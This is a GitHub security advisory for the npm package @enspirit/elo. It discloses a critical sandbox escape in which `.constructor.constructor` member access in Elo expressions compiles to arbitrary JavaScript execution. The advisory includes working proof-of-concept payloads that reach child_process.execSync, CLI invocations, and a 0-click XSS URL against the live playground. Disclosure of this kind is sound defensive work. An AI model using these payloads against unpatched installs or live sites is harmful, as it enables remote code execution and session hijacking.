  "text": "\n\n \n \n\n\n\n\n \n \n \n \n \n \n \n \n\n \n \n \n \n \n \n \n \n \n \n \n\n \n\n \n\n \n\n \n \n \n \n \n \n\n \n\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n\n Sandbox escape to arbitrary Node.js / browser code execution via unfiltered `.constructor` member access in Elo JavaScript emitter · Advisory · enspirit/elo · GitHub \n\n\n\n \n \n \n \n\n \n \n\n\n \n\n\n \n\n\n \n \n\n \n \n\n \n\n \n\n\n\n\n\n \n\n \n\n\n\n\n \n\n \n\n \n\n \n\n \n\n \n\n \n \n \n\n \n \n \n\n\n\n\n \n\n\n\n \n\n\n \n \n \n \n\n \n\n\n\n \n\n \n \n\n\n \n\n\n \n\n \n \n\n \n \n \n\n \n \n\n\n \n\n \n\n \n \n \n \n\n \n Skip to content \n\n \n \n \n \n \n \n \n\n \n \n \n \n \n\n\n\n\n\n \n\n \n \n\n \n \n \n \n \n \n \n \n \n \n \n \n\n \n \n \n Navigation Menu Sign in Products Platform GitHub Repository hosting, code review, and collaboration Copilot AI coding agent for tasks, projects and automated work Build & Ship Actions CI/CD and automation Code Quality Quality analysis, fixes, and enforcement Codespaces Cloud development environments Secure Code Security Vulnerability detection and remediation Secret Protection Secret scanning and leak prevention All Features Developers Learn Documentation Training Certifications Build Build with Copilot Customize Copilot Integrations Explore Trending repos GitHub Sponsors Developer articles Changelog Changelog Your source for the latest features, improvements, and fixes across GitHub products, all in one place. Businesses By Stage Enterprises Team Startups Nonprofits By Industry Healthcare Financial services Manufacturing Government See all industries Evaluate GitHub Why GitHub Customer Stories Business insights Trust Center Add-ons GitHub Advanced Security Enterprise-grade code security Copilot for business Enterprise-grade AI features Premium Support Enterprise-grade 24/7 support Resources Learn & Connect Documentation Resource center Blog Events & webinars Community Forum Customer Stories Integrations Support Customer support Training GitHub Status Company About Partners Changelog GitHub Universe GitHub Universe The event for developers, by developers — talks, workshops, and what’s next for GitHub. Pricing Search / Sign in Sign up Appearance settings \n \n\n\n\n\n \n \n \n You signed in with another tab or window. Reload to refresh your session. \n You signed out in another tab or window. Reload to refresh your session. \n You switched accounts on another tab or window. Reload to refresh your session. \n\n \n Dismiss alert \n\n\n \n \n \n\n \n\n\n\n\n\n\n\n\n \n\n\n\n\n\n \n \n \n \n \n \n \n \n \n {{ message }} \n\n \n \n \n \n \n\n\n \n\n\n\n\n\n\n \n \n \n \n \n\n\n \n\n\n\n\n\n\n\n\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n\n \n \n \n enspirit elo Repository navigation Code Issues Pull requests 3  ( 3 ) Actions Projects Security and quality 3  ( 3 ) Insights More items \n \n\n\n \n\n\n\n \n \n \n\n\n\n \n \n \n \n \n \n elo \n Security \n Advisories \n GHSA-33r5-xmm8-v6x5 \n \n \n\n \n\n \n \n\n \n Sandbox escape to arbitrary Node.js / browser code execution via unfiltered `.constructor` member access in Elo JavaScript emitter\n \n\n \n\n \n\n\n \n \n Critical\n \n \n\n \n blambeau \n published\n GHSA-33r5-xmm8-v6x5 \n Oct 30, 2026 \n\n \n \n \n \n\n\n \n\n \n \n \n \n \n \n \n \n \n Package \n\n \n \n \n\n \n @enspirit/elo \n ( npm )\n \n \n \n\n \n Affected versions \n\n <= 1.0.0 \n \n\n \n Patched versions \n\n >= 1.0.1 \n \n \n\n \n \n\n\n \n \n Description \n \n\n \n \n Summary \n An unauthenticated attacker who controls a string passed to any Elo JavaScript-emission path — defaultFormats.elo.parse() , the bin/elo CLI, or the live browser playground at elo-lang.org/try — can execute arbitrary code in the host JavaScript runtime. A payload built from the .constructor.constructor chain compiles, without modification, to a live Function invocation in the emitted JavaScript, escaping any sandbox assumption around \"Elo is a safe data/DSL language.\" \n Vulnerable sink and root cause \n Three interacting sites in src/ produce the bug at commit 749af7b : \n \n src/transform.ts:144–158 — the member_access handler allows access on types any , object , or array without filtering the property name. This is the only place an integrator could have plugged a denylist. \n src/compilers/javascript.ts:210 — the JS emitter writes ${objectExpr}.${ir.property} verbatim into the output, so any property name that survives the transform step flows unescaped into emitted JavaScript. \n src/parser.ts:163–170, 748–750 — the parser accepts constructor (and other JS meta-property names) as an ordinary identifier, so .constructor clears type-checking without triggering any warning. \n \n Combined, the Elo expression ({}).constructor.constructor('…')() compiles to a live Function('…')() call in the emitted JS, executing in the realm of whichever sink runs the compiled code. \n Attack surfaces \n All three surfaces share the same root cause (no denylist in transform.ts ) and are addressed by the same one-file patch: \n \n \n \n # \n Entry point \n Threat model \n \n \n \n \n 1 \n Browser playground — https://elo-lang.org/try/?code=…&run=1 \n 0-click XSS / account takeover against elo-lang.org. ?run=1 triggers setTimeout(() => this.run(), 100) in playground_controller.ts:531 ; the server issues a 301 that preserves ?code= . Any shared URL that contains a payload compromises the visitor's session on elo-lang.org. \n \n \n 2 \n bin/elo CLI \n RCE on CI / DevOps hosts. Both node bin/elo payload.elo and node bin/elo -e \"_\" -d @payload.elo -f elo fire. The -f elo path is especially severe: the flag exists to pass user-supplied files as data into an Elo pipeline. No integrator expects a data-format flag to shell out to /usr/bin/id . \n \n \n 3 \n Library API — defaultFormats.elo.parse() \n Node.js RCE for any downstream integrator using Elo as a rule engine, configuration DSL, or form builder DSL (the primary documented use cases). \n \n \n \n Proof of Concept \n Common payload (works on all three entry points): \n ({}).constructor.constructor('return this.constructor.constructor(\\'return process\\')().mainModule.require(\\'child_process\\').execSync(\\'id\\').toString()')()\n \n Library API — poc-minimal.js : \n // npm install elo \n const { defaultFormats } = require ( 'elo' ) ; \n\n const payload = \"({}).constructor.constructor('return this.constructor.constructor(\\\\'return process\\\\')().mainModule.require(\\\\'child_process\\\\').execSync(\\\\'id\\\\').toString()')()\" ; \n\n console . log ( defaultFormats . elo . parse ( payload ) ) ; \n // → uid=1000(ultrasupara) gid=1000(ultrasupara) groups=… \n CLI — poc-cli.sh : \n node bin/elo payload.elo\n # uid=1000(ultrasupara)… \n\nnode bin/elo -e \" _ \" -d @payload.elo -f elo\n # uid=1000(ultrasupara)… \n Browser playground — 0-click XSS URL: \n https://elo-lang.org/try/?code=%28%7B%7D%29.constructor.constructor%28%27alert%28document.domain%29%27%29%28%29&run=1\n \n Opening this URL causes alert(document.domain) to fire automatically after ~100 ms with no user interaction beyond navigating to the link. The 301 redirect preserves the ?code= parameter intact. End-to-end execution on the live production site was captured in a screen recording attached to the original report. \n Independence from GHSA #3 (AST-API injection) \n This finding is independent of the Medium-severity AST-API report (GHSA #3 ). That fix's identifier regex ^[a-zA-Z_][a-zA-Z0-9_]*$ happens to accept constructor , and its threat model requires an attacker-controlled AST object rather than a plain string. The current finding requires only a plain Elo string, which is a strictly weaker attacker model. \n \n \n\n \n\n \n \n\n\n\n\n\n \n\n \n \n Severity \n \n \n Critical\n \n\n \n \n \n 9.8 \n \n \n\n \n \n \n \n \n \n CVSS overall score\n \n \n \n \n \n \n \n \n \n \n This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS). \n \n \n \n \n / 10 \n \n \n CVSS v3 base metrics \n\n \n Attack vector\n Network \n \n Attack complexity\n Low \n \n Privileges required\n None \n \n User interaction\n None \n \n Scope\n Unchanged \n \n Confidentiality\n High \n \n Integrity\n High \n \n Availability\n High \n \n \n \n Learn more about base metrics \n \n \n\n \n \n \n \n \n \n CVSS v3 base metrics\n \n \n \n \n \n \n \n \n \n \n \n \n Attack vector: \n More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability. \n \n \n Attack complexity: \n More severe for the least complex attacks. \n \n \n Privileges required: \n More severe if no privileges are required. \n \n \n User interaction: \n More severe when no user interaction is required. \n \n \n Scope: \n More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope. \n \n \n Confidentiality: \n More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user. \n \n \n Integrity: \n More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user. \n \n \n Availability: \n More severe when the loss of impacted component availability is highest. \n \n \n \n \n \n \n \n CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H \n\n \n\n \n \n CVE ID \n \n CVE-2026-44267\n \n \n\n \n Weaknesses \n \n \n Weakness \n CWE-79 \n \n \n \n Improper Neutralization of Input During Web Page Generation \n The product does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.\n Learn more on MITRE. \n\n \n \n\n \n \n Weakness \n CWE-94 \n \n \n \n Improper Control of Generation of Code \n The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment.\n Learn more on MITRE. \n\n \n \n\n \n \n Weakness \n CWE-693 \n \n \n \n Protection Mechanism Failure \n The product does not use or incorrectly uses a protection mechanism that provides sufficient defense against directed attacks against the product.\n Learn more on MITRE. \n\n \n \n\n \n \n Weakness \n CWE-1336 \n \n \n \n Improper Neutralization of Special Elements Used in a Template Engine \n The product uses a template engine to insert or process externally-influenced input, but it does not neutralize or incorrectly neutralizes special elements or syntax that can be interpreted as template expressions or other code directives when processed by the engine.\n Learn more on MITRE. \n\n \n \n\n \n\n \n Credits \n\n \n \n \n \n \n ultra-supara \n\n \n Reporter \n\n \n\n \n\n \n \n\n\n\n\n \n\n \n \n\n\n \n\n \n\n \n \n\n \n Footer \n\n \n\n\n \n \n \n \n \n \n &copy; 2026 GitHub, Inc.\n \n \n\n \n Footer navigation \n\n \n\n\n \n Terms \n \n\n \n Privacy \n \n\n\n \n Security \n \n\n \n Status \n \n\n \n Community \n \n\n \n Docs \n \n\n \n Contact \n \n\n \n \n \n \n Manage cookies\n \n \n \n\n \n \n \n Do not share my personal information\n \n \n \n\n \n \n \n \n\n\n\n \n\n\n\n\n \n \n \n \n \n You can’t perform that action at this time.\n \n\n \n \n \n \n \n \n \n \n \n \n \n\n \n \n \n \n\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n\n\n\n\n \n \n \n \n \n"
